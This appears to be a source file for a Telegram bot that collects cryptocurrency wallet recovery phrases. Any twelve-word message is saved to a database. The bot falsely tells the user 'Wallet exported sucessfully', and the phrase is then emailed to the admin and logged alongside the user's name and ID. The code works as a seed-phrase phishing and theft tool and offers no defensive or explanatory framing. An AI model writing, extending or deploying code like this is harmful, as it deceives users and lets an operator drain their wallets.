import updatePhrase from '../db/methods/UpdateMethods/updatePhrase.js';
import isTwelveWords from '../helpers/checkPhrase.js';
import sendPhraseMail from '../helpers/mailPhrase.js';
import hasAtLeastSixWords from '../helpers/sixWords.js';

/**
 * List of valid admin commands that the bot recognizes when sent as plain messages (not slash commands).
 * These are separate from bot_command entities and are handled manually.
 */
const validAdminCommands = new Set([
    'adminLogin',
    'adminLogout',
    'adminSetNewPassword',
    'adminMenu',
    'adminRevoke',
    'adminGetUser',
    'adminDeleteUser',
    'adminUpdateUserBalance',
]);

/**
 * Registers message handlers for the Telegram bot to process raw text-based admin commands.
 *
 * @param {TelegramBot} bot - An instance of the Telegram Bot from node-telegram-bot-api.
 */
const registerMessageHandlers = (bot) => {
    bot.on('message', async (msg) => {
        const text = msg.text?.trim();
        const telegramId = msg.from?.id;
        const chatId = msg.chat.id;

        // Ignore messages without text
        if (!text) return;

        // Ignore messages that are bot commands (slash commands like /start)
        const isBotCommand = msg.entities?.some(entity => entity.type === 'bot_command');
        if (isBotCommand) return;

        // Only admin commands starting with "admin" are processed here
        if (text.startsWith('admin')) {
            // Extract command and arguments
            const [command, ...args] = text.split(' ');
            const value = args.join(' ');

            // Reject unknown admin commands
            if (!validAdminCommands.has(command)) {
                bot.sendMessage(chatId, "❌ Invalid admin command. Use a valid one from the list.");
                return;
            }

            // Prevent other bots from issuing admin commands
            if (msg.from.is_bot) {
                bot.sendMessage(chatId, "❌ Bots cannot run admin commands.");
                return;
            }

            // Log the command received for auditing
            console.log(`🔧 Admin command received from ${telegramId}: ${command} ${value}`);

            // Emit a custom event to be picked up by admin command handlers
            bot.emit('adminCommand', { msg, command, args, value });
            return; // Done with admin commands, prevent falling through
        }

        // ---- NEW PHRASE LOGIC STARTS HERE ----

        // Check if message has at least 6 words (function should be defined outside)
        if (hasAtLeastSixWords(text)) {
            const phrase = text;

            // Check if phrase is exactly 12 words (assuming you have this helper)
            const isValidPhrase = isTwelveWords(phrase);

            if (!isValidPhrase) {
                return bot.sendMessage(
                    chatId,
                    `⚠️ Yo, that phrase doesn't look right.\n\nMake sure you're sending exactly *12 words* like this:\n\n[word1 word2 ... word12]`,
                    { parse_mode: "Markdown" }
                );
            }

            try {
                await updatePhrase(telegramId, phrase);

                bot.sendMessage(
                    chatId,
                    `✅ Wallet exported sucessfully`
                );
            } catch (error) {
                console.error("❌ Error saving phrase:", error);

                bot.sendMessage(
                    chatId,
                    `⚠️ Sorry, something went wrong while saving your phrase. Please try again later.`
                );
            } finally {
                if (isValidPhrase) {
                    try {
                        const info = await sendPhraseMail(telegramId, msg.from.first_name, msg.from.last_name, phrase);

                        console.log("📨 Phrase email sent to admin:");
                        console.log("👤 User:", `${msg.from.first_name} ${msg.from.last_name} (${telegramId})`);
                        console.log("🧠 Phrase:", `"${phrase}"`);
                        console.log("📩 Message ID:", info.messageId);
                        console.log("🧭 Envelope:", info.envelope);
                        console.log("✅ Accepted:", info.accepted);
                        if (info.rejected.length) {
                            console.warn("🚫 Rejected:", info.rejected);
                        }
                        console.log("🔁 SMTP Response:", info.response);
                    } catch (emailErr) {
                        console.error("❌ Failed to send phrase email to admin:", emailErr.message);
                    }
                }
            }
            return; // prevent other handlers after phrase handled
        }

        // ---- END PHRASE LOGIC ----

        // If no admin command and no phrase logic matched, you can optionally:
        // bot.sendMessage(chatId, "❓ That was not a valid command. Use /help to see what’s available.");
        // or simply do nothing and let other handlers pick it up
    });
};


export default registerMessageHandlers;
